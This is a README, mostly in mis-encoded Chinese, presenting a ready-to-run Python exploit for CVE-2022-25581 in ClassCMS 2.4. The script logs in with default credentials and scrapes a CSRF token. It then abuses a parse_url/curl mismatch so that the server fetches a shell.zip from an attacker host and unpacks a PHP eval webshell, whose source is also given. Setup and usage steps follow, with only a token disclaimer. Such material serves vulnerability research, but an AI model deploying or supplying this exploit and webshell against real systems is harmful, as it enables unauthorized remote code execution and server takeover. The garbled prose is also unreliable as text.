# CVE-2022-25581

å…¨ç½‘éƒ½æœä¸åˆ°ï¼Œç•™ä¸‹å¤‡ä»½ï¼Œ**Python åˆ©ç”¨è„šæœ¬**ï¼Œç”¨äºè‡ªåŠ¨å®Œæˆä»¥ä¸‹æ­¥éª¤ï¼š

---

### âœ… è„šæœ¬åŠŸèƒ½ç›®æ ‡

1. ç™»å½•åå°ï¼ˆè·å– `csrf` å’Œ `token`ï¼‰
2. æ„é€ æ¶æ„è¯·æ±‚åŒ…ä¸Šä¼ å‹ç¼©åŒ…ï¼ˆåŒ…å« webshellï¼‰
3. è®¿é—®ä¸Šä¼ çš„ webshell è·å–æ§åˆ¶æƒé™ï¼ˆGET shellï¼‰

---

## ğŸ§¾ å‰ææ¡ä»¶

- ç›®æ ‡ç¯å¢ƒï¼šClassCMS 2.4
- WebæœåŠ¡å™¨ï¼šPHP 5.5 + MySQL
- æ”»å‡»è€…æ‹¥æœ‰ä¸€ä¸ªå¯è®¿é—®çš„ HTTP æœåŠ¡å™¨ï¼ˆç”¨äºæ‰˜ç®¡ `shell.zip`ï¼‰
- å·²çŸ¥åå°è·¯å¾„ï¼ˆå¦‚ `/admin666`ï¼‰
- åå°è´¦å·å¯†ç ä¸º `admin/admin`

---

## ğŸ”’ æ¼æ´åˆ©ç”¨åŸç†å›é¡¾

è¯¥ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´çš„æ ¸å¿ƒæ˜¯æ„é€ ä¸€ä¸ªç‰¹æ®Šæ ¼å¼çš„ URLï¼š

```
http://@<ip>:80@classcms.com/shell.zip
```

é€šè¿‡ PHP çš„ `parse_url()` ä¸ `curl` å¯¹ URL è§£ææ–¹å¼çš„ä¸åŒï¼Œç»•è¿‡ host ç™½åå•æ ¡éªŒã€‚

---

## ğŸ Python åˆ©ç”¨è„šæœ¬

```python
import requests
from bs4 import BeautifulSoup

# =============== é…ç½®ä¿¡æ¯ ===============
target_url = "http://192.168.12.144"
admin_path = "/admin666"  # åå°è·¯å¾„
login_url = f"{target_url}{admin_path}?do=login"

download_url = f"{target_url}{admin_path}?do=shop:downloadClass&ajax=1"

# ä½ çš„æ”»å‡»æœåŠ¡å™¨åœ°å€ï¼ˆå¿…é¡»èƒ½è¢«ç›®æ ‡è®¿é—®åˆ°ï¼‰
attacker_ip = "192.168.12.144"
attacker_port = 80
shell_zip_url = f"http://@{attacker_ip}:{attacker_port}@classcms.com/shell.zip"

# webshell æ–‡ä»¶å
webshell_name = "shell.php"
webshell_path = f"{target_url}/class/shell/{webshell_name}"

# ç™»å½•å‡­è¯
username = "admin"
password = "admin"

# ========================================

# è®¾ç½® session ç»´æŒ cookie
session = requests.Session()

# ================ Step 1: ç™»å½•åå° ================
def login():
    print("[*] æ­£åœ¨ç™»å½•åå°...")
    data = {
        "username": username,
        "password": password
    }
    res = session.post(login_url, data=data)
    if "é€€å‡ºç™»å½•" in res.text:
        print("[+] ç™»å½•æˆåŠŸï¼")
        return True
    else:
        print("[-] ç™»å½•å¤±è´¥ï¼Œè¯·æ£€æŸ¥ç”¨æˆ·å/å¯†ç æˆ–åå°è·¯å¾„æ˜¯å¦æ­£ç¡®ã€‚")
        return False

# ================ Step 2: è·å– csrf token ================
def get_csrf():
    url = f"{target_url}{admin_path}?do=shop:index&action=detail&classhash=debugswitch"
    res = session.get(url)
    soup = BeautifulSoup(res.text, 'html.parser')
    csrf_input = soup.find('input', {'name': 'csrf'})
    if csrf_input:
        return csrf_input['value']
    else:
        print("[-] æ— æ³•æå– csrf tokenï¼")
        return None

# ================ Step 3: ä¸Šä¼ å‹ç¼©åŒ…å¹¶è§£å‹ ================
def upload_shell(csrf_token):
    print(f"[*] æ­£åœ¨ä¸Šä¼  {shell_zip_url} ...")

    payload = {
        "classhash": "shell",
        "url": shell_zip_url,
        "csrf": csrf_token
    }

    headers = {
        "User-Agent": "Mozilla/5.0",
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
    }

    res = session.post(download_url, data=payload, headers=headers)

    if res.status_code == 200 and "ä¸‹è½½å®Œæˆ" in res.text:
        print("[+] ä¸Šä¼ æˆåŠŸï¼")
        return True
    else:
        print("[-] ä¸Šä¼ å¤±è´¥ï¼Œå“åº”å†…å®¹ï¼š", res.text)
        return False

# ================ Step 4: å°è¯•è®¿é—® webshell ================
def check_webshell():
    print(f"[*] æ­£åœ¨å°è¯•è®¿é—® webshellï¼š{webshell_path}")
    try:
        res = session.get(webshell_path, timeout=5)
        if res.status_code == 200:
            print("[+] æˆåŠŸè®¿é—® webshellï¼Œä½ ç°åœ¨å¯ä»¥ä½¿ç”¨èœåˆ€/èšå‰‘è¿æ¥ï¼")
            print(f"[+] åœ°å€ï¼š{webshell_path}")
        else:
            print("[-] webshell æœªæ‰¾åˆ°æˆ–æœªæ‰§è¡Œã€‚")
    except Exception as e:
        print("[-] è¿æ¥å¼‚å¸¸ï¼š", str(e))

# ================ ä¸»å‡½æ•° ================
if __name__ == "__main__":
    if login():
        csrf = get_csrf()
        if csrf:
            if upload_shell(csrf):
                check_webshell()
```

---

## ğŸ“ shell.zip æ–‡ä»¶åˆ¶ä½œæ–¹æ³•

1. åˆ›å»º `shell.php` å†…å®¹å¦‚ä¸‹ï¼š
   ```php
   <?php @eval($_POST['cmd']); ?>
   ```

2. æ‰“åŒ…ä¸º `shell.zip`ï¼Œç¡®ä¿ç»“æ„ä¸ºæ ¹ç›®å½•ç›´æ¥åŒ…å« `shell.php`ã€‚

3. æ”¾åœ¨ä½ çš„æ”»å‡»æœåŠ¡å™¨ä¸Šï¼Œç¡®ä¿å¯é€šè¿‡ä»¥ä¸‹ URL è®¿é—®ï¼š
   ```
   http://192.168.12.144/shell.zip
   ```

---

## ğŸ› ï¸ ä½¿ç”¨è¯´æ˜

1. å®‰è£…ä¾èµ–ï¼š

```bash
pip install requests beautifulsoup4
```

2. ä¿®æ”¹è„šæœ¬ä¸­çš„ IPã€ç«¯å£ã€è·¯å¾„ç­‰é…ç½®é¡¹ã€‚
3. åœ¨æ”»å‡»æœåŠ¡å™¨å¯åŠ¨ HTTP æœåŠ¡ï¼Œæä¾› `shell.zip` ä¸‹è½½ã€‚
4. æ‰§è¡Œè„šæœ¬ï¼š

```bash
python exploit_classcms.py
```

---

## ğŸ“Œ æ³¨æ„äº‹é¡¹

- ç¡®ä¿æ”»å‡»æœåŠ¡å™¨å¼€æ”¾ 80 ç«¯å£ä¸” `shell.zip` å¯æ­£å¸¸ä¸‹è½½ã€‚
- è‹¥ç›®æ ‡åå°è·¯å¾„ä¸åŒï¼Œè¯·ä¿®æ”¹ `admin_path`ã€‚
- å¦‚é‡ CSRF æ ¡éªŒå¤±è´¥ï¼Œè¯·é‡æ–°æŠ“åŒ…ç¡®è®¤ token æ˜¯å¦æ›´æ–°ã€‚
- æ­¤è„šæœ¬ä»…ä¾›æ•™å­¦ç ”ç©¶ç”¨é€”ï¼Œè¯·å‹¿ç”¨äºéæ³•å…¥ä¾µï¼

---
